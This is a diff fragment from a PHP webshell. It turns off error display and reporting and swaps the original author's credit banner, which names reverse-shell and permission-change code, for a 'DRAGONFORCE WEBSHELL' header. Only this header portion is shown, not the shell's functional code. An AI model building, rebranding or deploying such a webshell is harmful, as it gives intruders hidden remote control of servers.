@@ -3,12 +3,10 @@
 ini_set('display_errors', 0);
 ini_set('display_startup_errors', 0);
 error_reporting(0);
+
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 #                                                                               #
-#           This webshell are programmed and modified by Eagle Eye              #
-#                   Github : https://github.com/EagleTube                       #
-#               Youtube : https://www.youtube.com/c/EagleTube1337               #
-#          Referred : ivan-sincek(revershell) | 0x5a455553(PermChg)             #
+#                           DRAGONFORCE WEBSHELL                                #
 #                                                                               #
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 
